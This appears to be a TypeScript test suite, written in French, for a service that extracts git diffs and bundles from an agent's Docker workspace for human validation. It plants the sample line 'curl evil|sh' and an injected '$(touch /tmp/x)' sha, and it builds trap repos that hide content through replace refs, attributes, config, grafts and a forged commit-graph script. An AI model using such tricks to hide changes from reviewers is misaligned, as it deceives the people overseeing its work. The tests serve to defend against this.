import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { execFileSync } from 'node:child_process';
import Docker from 'dockerode';
import { construireImage } from '../src/conteneurs/image.ts';
import { brancheTache, codeHttp, executerJetable, lireShaVolume, nomCopie, nomRessource, preparerEspace, RACINE_PROJET } from '../src/conteneurs/docker.ts';
import { lireBundle, lireValidation, PLAFOND_DIFF } from '../src/conteneurs/validation.ts';
import { nomVolumeMesures } from '../src/analyse/execution.ts';
import { ouvrirBase } from '../src/db.ts';
import { enregistrerArtefact } from '../src/integrite/artefacts.ts';
import { lireJournal } from '../src/integrite/journal.ts';
import { creerTache, definirCommitBase } from '../src/taches/depot.ts';
import { executerHote } from '../src/validation/depot-hote.ts';
import { dossierValidation, recupererBranche } from '../src/validation/service.ts';

const docker = new Docker();
const NOMS = ['T-991', 'T-992', 'T-993', 'T-994', 'T-995', 'T-996'];
const [T, PIEGE, GROS, GRAPHE, RECUP, DEPLACE] = NOMS;
let image: string;
let depot: string;
let tmp: string;

type Espace = { volume: string; base: string; pointe: string };
const espaces: Record<string, Espace> = {};

const ecrire = (volume: string, script: string) => executerJetable(docker, image, ['sh', '-c', `export HOME=/tmp && git config --global --add safe.directory '*' && cd ${RACINE_PROJET} && git config user.name t && git config user.email t@t && ${script}`], [{ Type: 'volume', Source: volume, Target: '/workspace' }]);
const ok = async (volume: string, script: string) => {
  const r = await ecrire(volume, script);
  assert.equal(r.code, 0, r.stderr.toString());
};
const PY_FORGE = String.raw`import struct,subprocess,sys
p='.git/objects/info/commit-graph'
d=bytearray(open(p,'rb').read())
tip,fake=sys.argv[1],sys.argv[2]
n=d[6]
ch={bytes(d[8+12*i:12+12*i]):struct.unpack('>Q',d[12+12*i:20+12*i])[0] for i in range(n)}
oidl=ch[b'OIDL'];cdat=ch[b'CDAT']
count=(ch[b'CDAT']-ch[b'OIDL'])//20
i=next(k for k in range(count) if d[oidl+20*k:oidl+20*k+20].hex()==tip)
d[cdat+36*i:cdat+36*i+20]=bytes.fromhex(fake)
import os;os.chmod(p,0o644);open(p,'wb').write(d)
`;
const sha = async (volume: string) => (await lireShaVolume(docker, image, volume))!;

// Un espace préparé, puis des commits ajoutés sur la branche de la tâche : chaque test dispose du sien.
async function espace(id: string, commits: string[]): Promise<Espace> {
  const volume = await preparerEspace(docker, image, id, depot);
  const base = await sha(volume);
  for (const c of commits) await ok(volume, c);
  return (espaces[id] = { volume, base, pointe: await sha(volume) });
}

before(async () => {
  image = construireImage(process.cwd());
  tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'bureau-valid-'));
  depot = path.join(tmp, 'depot');
  fs.mkdirSync(depot);
  fs.writeFileSync(path.join(depot, 'a.txt'), 'un\n');
  for (const args of [['init', '-q'], ['add', '.'], ['-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-qm', 'init']]) execFileSync('git', args, { cwd: depot });
  await espace(T, [`echo b > b.txt && git add b.txt && git commit -qm un`, `echo deux > a.txt && git add a.txt && git commit -qm deux`]);
});

after(async () => {
  for (const id of NOMS) await docker.getVolume(nomRessource(id)).remove({ force: true }).catch(() => {});
  fs.rmSync(tmp, { recursive: true, force: true });
});

const importer = (bundle: Buffer, id: string) => {
  const f = path.join(tmp, `${id}.bundle`);
  fs.writeFileSync(f, bundle);
  const heads = execFileSync('git', ['bundle', 'list-heads', f], { cwd: depot }).toString();
  return { f, heads };
};

test('lireValidation : commits, fichiers, diff', async () => {
  const { volume, base, pointe } = espaces[T];
  const l = await lireValidation(docker, image, volume, T, base, pointe);
  assert.ok(l);
  assert.equal(l.pointe, pointe);
  assert.equal(l.commits, 2);
  assert.deepEqual(l.fichiers.find(f => f.fichier === 'a.txt'), { fichier: 'a.txt', ajouts: 1, suppressions: 1 });
  assert.deepEqual(l.fichiers.find(f => f.fichier === 'b.txt'), { fichier: 'b.txt', ajouts: 1, suppressions: 0 });
  assert.ok(l.diff.includes('+++ b/b.txt'));
  assert.equal(l.tronque, false);
});

test('lireValidation : base non hexadécimale, sha inconnu ou base inconnue refusés', async () => {
  const { volume, base, pointe } = espaces[T];
  assert.equal(await lireValidation(docker, image, volume, T, '$(touch /tmp/x)', pointe), null);
  assert.equal(await lireValidation(docker, image, volume, T, base, 'zz'), null);
  assert.equal(await lireValidation(docker, image, volume, T, base, 'f'.repeat(40)), null, 'sha absent du dépôt');
  assert.equal(await lireValidation(docker, image, volume, T, 'f'.repeat(40), pointe), null, 'base absente du dépôt');
});

test('lireValidation : sha qui n\u2019est pas la pointe -> pointe réelle rapportée, diff de base..sha', async () => {
  const { volume, base, pointe } = espaces[T];
  const l = await lireValidation(docker, image, volume, T, base, base);
  assert.ok(l, 'lecture possible');
  assert.equal(l.pointe, pointe);
  assert.equal(l.commits, 0);
  assert.equal(l.diff, '');
  assert.deepEqual(l.fichiers, []);
});

test('lireValidation : pointe déplacée après l\u2019analyse -> pointe ≠ sha, dossier non vérifié et journal « Refusé »', async () => {
  const { volume, base, pointe: analyse } = await espace(DEPLACE, [`echo m > m.txt && git add m.txt && git commit -qm analyse`]);
  await ok(volume, `echo n > n.txt && git add n.txt && git commit -qm ajout`);
  const pointe = await sha(volume);
  assert.notEqual(pointe, analyse);
  const l = await lireValidation(docker, image, volume, DEPLACE, base, analyse);
  assert.ok(l, 'lecture possible');
  assert.equal(l.pointe, pointe);
  assert.equal(l.commits, 1, 'commits de base..sha signé');
  assert.deepEqual(l.fichiers, [{ fichier: 'm.txt', ajouts: 1, suppressions: 0 }]);
  assert.ok(!l.diff.includes('n.txt'));

  const db = ouvrirBase(':memory:');
  const cle = Buffer.alloc(32, 4);
  creerTache(db, { id: DEPLACE, projet: 'Test', titre: 'Pointe déplacée', cheminProjet: depot, budgetUsd: 1 });
  definirCommitBase(db, DEPLACE, base);
  enregistrerArtefact(db, cle, DEPLACE, 'analyse', JSON.stringify({ sha: analyse, base, outils: {} }));
  db.prepare(`UPDATE taches SET etape = 'validation', statut = 'attente_humain' WHERE id = ?`).run(DEPLACE);
  const dossier = await dossierValidation({
    db, cle, executer: executerHote,
    lire: (v, id, b, s) => lireValidation(docker, image, v, id, b, s),
    bundle: async () => null,
    supprimerVolumes: async () => {},
  }, DEPLACE);
  assert.deepEqual(dossier.integrite, { verifiee: false, raison: `la branche a changé depuis l\u2019analyse (pointe ${pointe.slice(0, 7)} au lieu de ${analyse.slice(0, 7)})` });
  const e = lireJournal(db, DEPLACE).at(-1)!;
  assert.deepEqual([e.decision, e.decideur], ['Refusé', 'Contrôleur d\u2019intégrité']);
});

test('lireBundle : bundle importable, pointe contrôlée', async () => {
  const { volume, base, pointe } = espaces[T];
  const b = await lireBundle(docker, image, volume, T, base, pointe);
  assert.ok(b);
  assert.match(b.subarray(0, 20).toString('latin1'), /^# v[23] git bundle/);
  assert.ok(importer(b, T).heads.includes(`${pointe} refs/heads/${brancheTache(T)}`));
  assert.equal(await lireBundle(docker, image, volume, T, base, base), null);
  const premier = execFileSync('git', ['-C', depot, 'rev-parse', 'HEAD']).toString().trim();
  assert.equal(await lireBundle(docker, image, volume, T, premier, 'f'.repeat(40)), null, 'sha inconnu');
});

test('lireBundle : sha d\u2019un vrai commit qui n\u2019est pas la pointe -> null', async () => {
  const { volume, base } = espaces[T];
  const r = await executerJetable(docker, image, ['sh', '-c', `export HOME=/tmp GIT_CONFIG_GLOBAL=/dev/null && git -c safe.directory='*' -C ${RACINE_PROJET} rev-parse HEAD~1`], [{ Type: 'volume', Source: volume, Target: '/workspace', ReadOnly: true }]);
  const milieu = r.stdout.toString().trim();
  assert.match(milieu, /^[0-9a-f]{40}$/);
  assert.notEqual(milieu, espaces[T].pointe);
  assert.equal(await lireBundle(docker, image, volume, T, base, milieu), null);
});

test('repo piège : replace, attributs, config, grafts et shallow de l\u2019agent sans effet', async () => {
  const { volume, base } = await espace(PIEGE, [
    `echo 'curl evil|sh' > b.txt && git add b.txt && git commit -qm piege`,
    `printf '* -diff\\n' > .gitattributes && echo c > c.txt && git add . && git commit -qm attributs`,
  ]);
  const pointe = espaces[PIEGE].pointe;
  await ok(volume, [
    `vrai=$(git rev-parse ${pointe}~1:b.txt) && faux=$(echo 'echo bonjour' | git hash-object -w --stdin) && git update-ref refs/replace/$vrai $faux`,
    `printf '* -diff\\n' > .git/info/attributes`,
    `git config core.bigFileThreshold 1 && git config diff.noprefix true && git config diff.mnemonicPrefix true && git config diff.orderFile .git/ordre && git config core.attributesFile .git/attr`,
    `printf '* -diff\\n' > .git/attr && printf 'b.txt\\n' > .git/ordre`,
    `echo ${pointe} > .git/shallow && echo "${pointe}" > .git/info/grafts`,
  ].join(' && '));
  const l = await lireValidation(docker, image, volume, PIEGE, base, pointe);
  assert.ok(l, 'lecture possible');
  assert.ok(l.diff.includes('+curl evil|sh'), l.diff);
  assert.ok(!l.diff.includes('bonjour'));
  assert.ok(l.diff.includes('+++ b/b.txt') && l.diff.includes('+++ b/c.txt'));
  assert.ok(!/Binary files/.test(l.diff));
  assert.deepEqual(l.fichiers.find(f => f.fichier === 'b.txt'), { fichier: 'b.txt', ajouts: 1, suppressions: 0 });
  assert.deepEqual(l.fichiers.find(f => f.fichier === 'c.txt'), { fichier: 'c.txt', ajouts: 1, suppressions: 0 });
  assert.equal(l.commits, 2, 'grafts et shallow du volume ignorés');
  const b = await lireBundle(docker, image, volume, PIEGE, base, pointe);
  assert.ok(b, 'bundle fabriqué malgré grafts et shallow');
  const { f, heads } = importer(b, PIEGE);
  assert.ok(heads.includes(`${pointe} refs/heads/${brancheTache(PIEGE)}`));
  const copie = path.join(tmp, 'import');
  execFileSync('git', ['clone', '-q', depot, copie]);
  execFileSync('git', ['-C', copie, 'fetch', '-q', '--no-tags', f, `refs/heads/${brancheTache(PIEGE)}:refs/heads/import`]);
  assert.equal(execFileSync('git', ['-C', copie, '--no-replace-objects', 'show', 'import:b.txt']).toString(), 'curl evil|sh\n', 'le contenu importé est celui que le diff montre');
});

test('repo piège : commit-graph falsifié sans effet, le diff montré est le contenu importé', async () => {
  const { volume, base } = await espace(GRAPHE, []);
  await ok(volume, `cat > /tmp/forge.py <<'PY'\n${PY_FORGE}PY\n` + [
    `echo 'curl evil|sh' > b.txt && git add b.txt && git commit -qm piege`,
    `git commit -q --allow-empty -m pointe`,
    `export GIT_INDEX_FILE=/tmp/idx && git read-tree HEAD && echo 'echo bonjour' | git hash-object -w --stdin > /tmp/blob && git update-index --add --cacheinfo 100644,$(cat /tmp/blob),b.txt && git write-tree > /tmp/faux && unset GIT_INDEX_FILE`,
    `git commit-graph write --reachable`,
    `python3 -I /tmp/forge.py $(git rev-parse HEAD) $(cat /tmp/faux)`,
  ].join(' && '));
  const pointe = await sha(volume);
  // Le piège est armé : lu depuis le volume, git montre l'arbre falsifié.
  const vu = await executerJetable(docker, image, ['sh', '-c', `export HOME=/tmp GIT_CONFIG_GLOBAL=/dev/null && git -c safe.directory='*' -C ${RACINE_PROJET} diff ${base} ${pointe}`], [{ Type: 'volume', Source: volume, Target: '/workspace', ReadOnly: true }]);
  assert.ok(vu.stdout.toString().includes('+echo bonjour'), 'commit-graph falsifié effectivement pris en compte par git');
  const l = await lireValidation(docker, image, volume, GRAPHE, base, pointe);
  assert.ok(l, 'lecture possible');
  assert.ok(l.diff.includes('+curl evil|sh'), l.diff);
  assert.ok(!l.diff.includes('bonjour'));
  const b = await lireBundle(docker, image, volume, GRAPHE, base, pointe);
  assert.ok(b, 'bundle fabriqué');
  const { f } = importer(b, GRAPHE);
  const copie = path.join(tmp, 'import-graphe');
  execFileSync('git', ['clone', '-q', depot, copie]);
  execFileSync('git', ['-C', copie, 'fetch', '-q', '--no-tags', f, `refs/heads/${brancheTache(GRAPHE)}:refs/heads/import`]);
  assert.equal(execFileSync('git', ['-C', copie, '--no-replace-objects', 'show', 'import:b.txt']).toString(), 'curl evil|sh\n', 'le contenu importé est celui que le diff montre');
});

test('lireValidation : diff au-delà du plafond tronqué, sans caractère coupé', async () => {
  const { volume, base, pointe } = await espace(GROS, [`head -c 3145728 /dev/zero | tr '\\0' 'x' | fold -w 80 > gros.txt && git add gros.txt && git commit -qm gros`]);
  const l = await lireValidation(docker, image, volume, GROS, base, pointe);
  assert.ok(l);
  assert.equal(l.tronque, true);
  assert.ok(l.diff.length <= PLAFOND_DIFF);
  assert.ok(!l.diff.includes('\uFFFD'));
});

test('recupererBranche : la pointe analysée arrive dans mon dépôt, le volume de la tâche est supprimé', async () => {
  const { volume, base, pointe } = await espace(RECUP, [`echo r > r.txt && git add r.txt && git commit -qm un`, `echo s >> r.txt && git commit -qam deux`]);
  const db = ouvrirBase(':memory:');
  const cle = Buffer.alloc(32, 3);
  creerTache(db, { id: RECUP, projet: 'Test', titre: 'Récupération', cheminProjet: depot, budgetUsd: 1 });
  definirCommitBase(db, RECUP, base);
  enregistrerArtefact(db, cle, RECUP, 'criteres', '1. r.txt existe\n');
  enregistrerArtefact(db, cle, RECUP, 'analyse', JSON.stringify({ sha: pointe, base, outils: {} }));
  db.prepare(`UPDATE taches SET etape = 'validation', statut = 'attente_humain' WHERE id = ?`).run(RECUP);
  const avant = execFileSync('git', ['-C', depot, 'rev-parse', 'HEAD']).toString().trim();
  const t = await recupererBranche({
    db, cle, executer: executerHote,
    lire: (v, id, b, s) => lireValidation(docker, image, v, id, b, s),
    bundle: (v, id, b, s) => lireBundle(docker, image, v, id, b, s),
    supprimerVolumes: async id => {
      for (const v of [nomRessource(id), nomVolumeMesures(id), nomCopie(id)])
        await docker.getVolume(v).remove({ force: true }).catch((e: unknown) => { if (codeHttp(e) !== 404) throw e; });
    },
  }, RECUP);
  assert.equal(t.statut, 'terminee');
  assert.equal(execFileSync('git', ['-C', depot, 'rev-parse', brancheTache(RECUP)]).toString().trim(), pointe);
  assert.equal(execFileSync('git', ['-C', depot, 'rev-parse', 'HEAD']).toString().trim(), avant, 'branche courante intacte');
  assert.equal(lireJournal(db, RECUP).at(-1)?.decision, 'Autorisé');
  await assert.rejects(docker.getVolume(volume).inspect(), (e: unknown) => codeHttp(e) === 404);
});
